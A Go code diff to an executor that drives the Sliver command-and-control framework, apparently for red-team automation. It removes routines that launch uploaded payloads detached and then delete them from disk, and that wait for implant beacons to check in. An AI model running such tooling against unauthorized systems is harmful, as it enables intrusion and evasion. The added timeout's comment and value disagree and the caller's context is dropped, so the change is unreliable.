@@ -14,7 +14,6 @@ import (
 	"strings"
 	"time"
 
-	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/rpcpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
@@ -49,8 +48,6 @@ func (e *Executor) Execute(ctx context.Context, sessionID string, action chain.A
 		return e.execPython(ctx, sessionID, action.Python)
 	case chain.ActionSliverRPC:
 		return e.execRPC(ctx, sessionID, action.RPCAction)
-	case chain.ActionWaitBeacon:
-		return e.execWaitBeacon(ctx, action.WaitBeacon)
 	default:
 		return "", "", 1, fmt.Errorf("executor received unresolved action type %q (should be pre-resolved by chain executor)", action.Type)
 	}
@@ -62,9 +59,13 @@ func (e *Executor) execCommand(ctx context.Context, sessionID string, cmd *chain
 		return "", "", 1, fmt.Errorf("nil command action")
 	}
 
+        // 5-minute deadline for slow commands
+        execCtx, execCancel := context.WithTimeout(context.Background(), 15*time.Minute)
+        defer execCancel()
+        _ = ctx
 	path, args := buildArgs(cmd.Interpreter, cmd.Cmd)
 
-	resp, err := e.rpc.Execute(ctx, &sliverpb.ExecuteReq{
+	resp, err := e.rpc.Execute(execCtx, &sliverpb.ExecuteReq{
 		Path:    path,
 		Args:    args,
 		Output:  true,
@@ -162,13 +163,6 @@ func (e *Executor) execBinary(ctx context.Context, sessionID string, bin *chain.
 		return "", "", 1, fmt.Errorf("Upload RPC for binary: %w", err)
 	}
 
-	// ── 4a. Detached launch (long-running payloads e.g. beacons) ────────────
-	// A beacon never exits, so a foreground Execute would block until timeout.
-	// Launch it detached and return immediately.
-	if bin.Background {
-		return e.launchDetached(ctx, sessionID, platform, remotePath, bin.Args, bin.Cleanup)
-	}
-
 	// ── 4. Execute ──────────────────────────────────────────────────────────
 	var execCmd *chain.CommandAction
 	switch platform {
@@ -201,37 +195,6 @@ func (e *Executor) execBinary(ctx context.Context, sessionID string, bin *chain.
 	}
 
 	return stdout, stderr, exitCode, execErr
-}
-
-// launchDetached starts an already-uploaded binary in the background and returns
-// immediately, without waiting for the process to exit. This is required for
-// long-running payloads (e.g. Sliver beacons) that would otherwise block the step.
-//
-// On Linux the binary is chmod'd and started via nohup with stdio detached; on
-// Windows it is started with `start /B`. When cleanup is requested on Linux the
-// on-disk file is unlinked after a short delay (the running process keeps the
-// inode); on Windows a running executable cannot be deleted, so cleanup is skipped.
-func (e *Executor) launchDetached(ctx context.Context, sessionID, platform, remotePath, args string, cleanup bool) (string, string, int, error) {
-	var cmd *chain.CommandAction
-	switch platform {
-	case "windows":
-		line := fmt.Sprintf(`start "" /B %s`, remotePath)
-		if args != "" {
-			line += " " + args
-		}
-		cmd = &chain.CommandAction{Interpreter: "cmd", Cmd: line}
-	default:
-		line := fmt.Sprintf("chmod +x %s; nohup %s", remotePath, remotePath)
-		if args != "" {
-			line += " " + args
-		}
-		line += " >/dev/null 2>&1 </dev/null & echo \"launched pid $!\""
-		if cleanup {
-			line += fmt.Sprintf("; (sleep 2 && rm -f %s) >/dev/null 2>&1 &", remotePath)
-		}
-		cmd = &chain.CommandAction{Interpreter: "sh", Cmd: line}
-	}
-	return e.execCommand(ctx, sessionID, cmd)
 }
 
 // downloadBinary performs an HTTP GET and returns the response body.
@@ -465,72 +428,9 @@ func (e *Executor) execRPC(ctx context.Context, sessionID string, rpcAct *chain.
 	}
 }
 
-// execWaitBeacon polls the Sliver server until a beacon matching the filter checks
-// in, then returns its ID as stdout (capture with output_var to pivot later steps
-// onto it). Matching is a case-insensitive substring test on Hostname and/or
-// RemoteAddress; when neither is set the most recently checked-in beacon is chosen.
-// Returns exit 0 on match, exit 1 on timeout (triggering the step's on_fail policy).
-func (e *Executor) execWaitBeacon(ctx context.Context, wb *chain.WaitBeaconAction) (string, string, int, error) {
-	if wb == nil {
-		return "", "", 1, fmt.Errorf("nil wait_beacon action")
-	}
-
-	timeout := 120 * time.Second
-	if wb.Timeout != "" {
-		if d, err := time.ParseDuration(wb.Timeout); err == nil && d > 0 {
-			timeout = d
-		}
-	}
-	poll := 5 * time.Second
-	if wb.PollInterval != "" {
-		if d, err := time.ParseDuration(wb.PollInterval); err == nil && d > 0 {
-			poll = d
-		}
-	}
-	hostNeedle := strings.ToLower(wb.Hostname)
-	addrNeedle := strings.ToLower(wb.RemoteAddress)
-
-	deadline := time.Now().Add(timeout)
-	for {
-		listCtx, cancel := context.WithTimeout(ctx, 15*time.Second)
-		beacons, err := e.rpc.GetBeacons(listCtx, &commonpb.Empty{})
-		cancel()
-		if err != nil {
-			return "", "", 1, fmt.Errorf("GetBeacons RPC: %w", err)
-		}
-
-		var best *clientpb.Beacon
-		for _, b := range beacons.GetBeacons() {
-			if hostNeedle != "" && !strings.Contains(strings.ToLower(b.GetHostname()), hostNeedle) {
-				continue
-			}
-			if addrNeedle != "" && !strings.Contains(strings.ToLower(b.GetRemoteAddress()), addrNeedle) {
-				continue
-			}
-			if best == nil || b.GetLastCheckin() > best.GetLastCheckin() {
-				best = b
-			}
-		}
-		if best != nil {
-			info := fmt.Sprintf("matched beacon %s host=%q addr=%q os=%q",
-				best.GetID(), best.GetHostname(), best.GetRemoteAddress(), best.GetOS())
-			return best.GetID(), info, 0, nil
-		}
-
-		if time.Now().After(deadline) {
-			return "", fmt.Sprintf("no matching beacon checked in within %s", timeout), 1, nil
-		}
-		select {
-		case <-ctx.Done():
-			return "", "", 1, ctx.Err()
-		case <-time.After(poll):
-		}
-	}
-}
-
-// reqFor builds a commonpb.Request with the given session ID.
+// reqFor builds a commonpb.Request with the given session ID and a long timeout.
 func reqFor(sessionID string) *commonpb.Request {
-	return &commonpb.Request{SessionID: sessionID}
+	return &commonpb.Request{SessionID: sessionID, Timeout: 300}
 }
 
 // buildArgs constructs the executable path and argument list for the given interpreter.
